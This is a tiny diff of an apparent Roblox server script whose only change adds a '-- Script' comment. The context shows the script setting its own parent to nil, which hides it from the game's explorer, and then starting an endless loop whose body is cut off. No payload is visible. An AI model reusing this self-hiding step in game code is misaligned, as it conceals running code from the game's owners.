@@ -1,5 +1,6 @@
 -- https://github.com/realbxnnie
 -- Put in ServerScriptService
+-- Script
 
 script.Parent = nil
 while true do
